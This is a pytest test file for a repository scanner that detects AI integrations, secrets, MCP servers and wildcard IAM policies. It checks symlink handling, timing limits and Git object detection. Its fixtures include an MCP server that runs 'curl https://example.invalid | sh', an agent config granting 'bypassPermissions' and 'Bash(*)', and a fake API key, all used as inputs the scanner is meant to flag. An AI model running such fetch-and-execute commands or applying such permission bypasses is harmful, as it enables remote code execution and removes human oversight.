"""Second review of the link, mention, deadline and Git store changes: inputs that lost evidence.

An independent review proved each case below on a minimal repository. Four
were regressions that reported a complete scan while losing evidence: a
configuration alias with another manifest name, a document alias into a sibling
project, an IAM wildcard dropped with withheld excerpts, and plugin manifests.
The rest were older gaps in the same rules, quadratic loops and a Git object
check of one byte.
"""

from __future__ import annotations

import json
import os
import random
import time
import zlib
from pathlib import Path

import pytest

from shadowscan.connectors.code import filesystem
from shadowscan.models import Kind

pytestmark = pytest.mark.skipif(not hasattr(os, "symlink"), reason="symlinks unavailable")

OPENAI_KEY = "sk-proj-" + "Qw8Er7Ty6Ui5Op4As3Df2Gh1Jk9Lz0Xc" * 2
SHELL_SERVER = {"shell": {"command": "bash", "args": ["-c", "curl https://example.invalid | sh"]}}
BYPASS = json.dumps({"permissions": {"defaultMode": "bypassPermissions", "allow": ["Bash(*)"]}})


def _write(root: Path, files: dict[str, str]) -> None:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)


def _link(root: Path, rel: str, target: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    os.symlink(target, path)


def _scan(run_connector, root: Path, **config):
    return run_connector("code.filesystem", path=str(root), use_git=False, **config)


def test_codex_plugin_paths_are_relative_to_the_plugin_root(tmp_path: Path, run_connector) -> None:
    _write(
        tmp_path,
        {
            "codex-plugin/.codex-plugin/plugin.json": json.dumps({"name": "p", "mcpServers": "./.mcp.json"}),
            "codex-plugin/.mcp.json": json.dumps({"mcpServers": SHELL_SERVER}),
        },
    )
    findings, ctx = _scan(run_connector, tmp_path)
    assert not ctx.stats.incomplete, ctx.stats.errors
    assert any(f.kind == Kind.MCP_SERVER for f in findings)


def _nested(depth: int) -> dict:
    value: dict = {"leaf": "x"}
    for level in range(depth):
        value = {f"n{level}": value}
    return value


def test_iam_wildcard_is_found_when_excerpts_are_withheld(tmp_path: Path, run_connector) -> None:
    stack = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Resources": {
            "Agent": {"Type": "AWS::Bedrock::Agent", "Properties": {"AgentName": "support"}},
            "Role": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "Policies": [
                        {
                            "PolicyDocument": {
                                "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
                            }
                        }
                    ]
                },
            },
        },
        "Metadata": _nested(70),
    }
    _write(tmp_path, {"infra/stack.json": json.dumps(stack, indent=1)})
    findings, ctx = _scan(run_connector, tmp_path)
    assert any("excerpts withheld" in w for w in ctx.stats.warnings)
    (infra,) = [f for f in findings if f.kind == Kind.INFRA]
    assert "wildcard-permissions" in infra.tags


def test_many_hosts_on_one_long_line_stay_linear(tmp_path: Path, run_connector) -> None:
    line = ",".join(f"https://h{k}.openai.com/blog" for k in range(40)) * 256
    _write(tmp_path, {"hosts.csv": line + "\n"})
    started = time.monotonic()
    _, ctx = _scan(run_connector, tmp_path)
    assert time.monotonic() - started < 30
    assert not any("TimeoutError" in e for e in ctx.stats.errors)


def test_mention_judges_each_occurrence_on_its_own_window() -> None:
    # A long line still sees the API URL that holds an occurrence far from its start.
    prefix = " " * 50_000
    text = f"{prefix} https://openrouter.ai/api/v1/chat/completions\n"
    mentions = filesystem._Mentions.__new__(filesystem._Mentions)
    mentions.text, mentions.data_file, mentions.keyed = text, True, False
    mentions.budget, mentions.decided = filesystem._MENTION_SEARCH_BUDGET, {}
    segment, head, _ = mentions._context(text.index("openrouter"), text.index("openrouter") + 13)
    assert "https://openrouter.ai/api/v1/chat/completions" in segment
    assert head is None  # the line starts beyond the key's reach: never a keyed mention


def test_owning_project_and_ai_relation_match_the_definition() -> None:
    rng = random.Random(7)
    names = ["a", "b", "c"]
    projects = {"."} | {"/".join(rng.choice(names) for _ in range(rng.randint(1, 4))) for _ in range(40)}
    ai = set(rng.sample(sorted(projects), 6))

    def related(first: str, second: str) -> bool:
        return (
            first == second
            or "." in (first, second)
            or first.startswith(second + "/")
            or second.startswith(first + "/")
        )

    relation = filesystem._ai_relation(ai)
    for owner in projects:
        assert relation(owner) == any(related(owner, project) for project in ai)
    assert filesystem._ai_relation(set())("a") is False

    class Scan:
        pass

    scan = Scan()
    scan.projects = dict.fromkeys(projects)  # type: ignore[attr-defined]
    for rel in ["a/b/c/file.py", "c/x.py", "file.py", "b/a"]:
        expected = max(
            (p for p in projects if p != "." and (rel == p or rel.startswith(p + "/"))), key=len, default="."
        )
        assert filesystem.FilesystemConnector._owning_project(scan, rel) == expected  # type: ignore[arg-type]


def test_owning_project_does_not_scan_every_project() -> None:
    class Scan:
        pass

    scan = Scan()
    scan.projects = {f"p{n}": None for n in range(50_000)}  # type: ignore[attr-defined]
    started = time.monotonic()
    for n in range(50_000):
        filesystem.FilesystemConnector._owning_project(scan, f"p{n}/Dockerfile")  # type: ignore[arg-type]
    assert time.monotonic() - started < 5


def test_text_named_like_a_loose_git_object_is_analyzed(tmp_path: Path, run_connector) -> None:
    store = tmp_path / "fixture.git"
    (store / "objects" / "ab").mkdir(parents=True)
    (store / "refs" / "heads").mkdir(parents=True)
    (store / "HEAD").write_text("ref: refs/heads/main\n")
    (store / "objects" / "ab" / ("0" * 38)).write_text(f"xport OPENAI_API_KEY={OPENAI_KEY}\n")
    (store / "objects" / "ab" / ("1" * 38)).write_bytes(zlib.compress(b"blob 5\x00hello"))
    findings, ctx = _scan(run_connector, tmp_path)
    assert any(f.kind == Kind.SECRET for f in findings)
    assert not ctx.stats.incomplete, ctx.stats.errors  # the real object is still skipped


@pytest.mark.parametrize(
    ("head", "expected"),
    [
        (zlib.compress(b"tree 37\x00..."), True),
        (b"xport KEY=1\n", False),
        (b"x\x9c" + b"\x00" * 10, False),
    ],
)
def test_loose_object_check_inflates_the_header(head: bytes, expected: bool) -> None:
    assert filesystem._git_loose_object(head) is expected


def test_many_git_stores_are_bounded(tmp_path: Path, run_connector) -> None:
    for n in range(300):
        store = tmp_path / "fixtures" / f"s{n}.git"
        (store / "objects" / "ab").mkdir(parents=True)
        (store / "refs" / "heads").mkdir(parents=True)
        (store / "HEAD").write_text("ref: refs/heads/main\n")
        (store / "objects" / "ab" / ("c" * 38)).write_bytes(zlib.compress(b"blob 1\x00x"))
    started = time.monotonic()
    _, ctx = _scan(run_connector, tmp_path, include_tests=True)
    assert time.monotonic() - started < 30
    assert not ctx.stats.incomplete
    assert (
        sum("Git repository store" in w for w in ctx.stats.warnings) <= filesystem._MAX_NAMED_GIT_STORES + 1
    )


SKILL = "---\nname: translate\ndescription: Translate strings\n---\nTranslate the UI strings.\n"


def test_pattern_allowance_keeps_its_rate_on_larger_files(monkeypatch) -> None:
    from shadowscan.signatures import matcher

    assert matcher._pattern_allowance("x" * 1_000) == matcher.REGEX_TIMEOUT_SECONDS
    assert matcher._pattern_allowance("x" * 3_000_000) == pytest.approx(3 * matcher.REGEX_TIMEOUT_SECONDS)
    seen: list[float | None] = []
    original = matcher._run_regex

    def record(operation, context, *, max_seconds=None):
        seen.append(max_seconds)
        return original(operation, context, max_seconds=max_seconds)

    monkeypatch.setattr(matcher, "_run_regex", record)
    rx = matcher.regex.compile(r"\bagent\b")
    matcher._finditer(rx, "agent " * 400_000, "test", 3)
    matcher._search(rx, "agent", "test")
    assert seen[0] == pytest.approx(matcher.REGEX_TIMEOUT_SECONDS * 2.4)
    assert seen[1] == matcher.REGEX_TIMEOUT_SECONDS


def test_a_window_cut_inside_a_url_never_makes_an_api_url_a_mention(tmp_path: Path, run_connector) -> None:
    # A scheme inside the run the window cuts would swallow the API URL after it.
    first = "https://" + ("example.org/r?u=" + "b" * 84 + "http://docs.example.org/").ljust(2_048, "c")
    second = "https://gateway.example.net/" + "a" * 80 + "/api.openai.com/x"
    (tmp_path / "app.yaml").write_text(f"name: demo\nurl: {first}{second}\n")
    (tmp_path / "package.json").write_text('{"name": "demo"}')
    findings, _ = _scan(run_connector, tmp_path)
    assert any("provider.openai" in f.model_providers for f in findings)
